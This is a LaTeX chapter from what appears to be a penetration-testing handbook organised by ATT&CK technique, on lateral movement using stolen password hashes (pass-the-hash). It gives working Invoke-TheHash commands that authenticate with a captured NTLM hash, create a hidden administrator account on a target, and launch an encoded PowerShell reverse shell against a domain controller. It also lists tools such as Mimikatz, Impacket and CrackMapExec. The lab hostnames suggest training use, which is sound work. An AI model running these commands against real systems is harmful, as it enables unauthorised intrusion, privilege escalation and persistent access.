\chapter{Lateral movement  (TA0008)}

\section{Use Alternate Authentication Material (T1550)}

\subsection{Pass the Hash}
Adversaries may "pass the hash" using stolen password hashes to move laterally
within an environment, bypassing normal system access controls. Pass the hash
(PtH) is a method of authenticating as a user without having access to the
user's cleartext password. This method bypasses standard authentication steps
that require a cleartext password, moving directly into the portion of the
authentication that uses the password hash.

Using:
\begin{itemize}
    \item \verb+Mimikatz+~\ref{tool:mimikatz:pth}
    \item
        \href{https://github.com/Kevin-Robertson/Invoke-TheHash}{Invoke-TheHash}: 
\begin{verbatim}
> Import-Module .\Invoke-TheHash.psd1
> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb `
    -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B ` 
    -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
#
# with a powershell base64 encoded reverse shell 
#
> Invoke-WMIExec -Target DC01 -Domain Administrator -Username julio ` 
    -Hash 64F12CDDAA88057E06A81B54E73B949B `
    -Command "powershell -e JABji.. .SNIP. .. DAGwAbwBzAGUAKAApAA=="
\end{verbatim}
    \item Impacket~\ref{tool:impacket} tools such as wmiexec, atexec, smbexec
        using pass the hash auth method 
    \item CrackMapExec~\ref{tool:crackmapexec}
    \item evil-winrm~\ref{tool:evil-winrm}
    \item xfreerdp
\end{itemize}


\subsection{Pass the Hash}

See~\ref{network:kerberos:ptt}
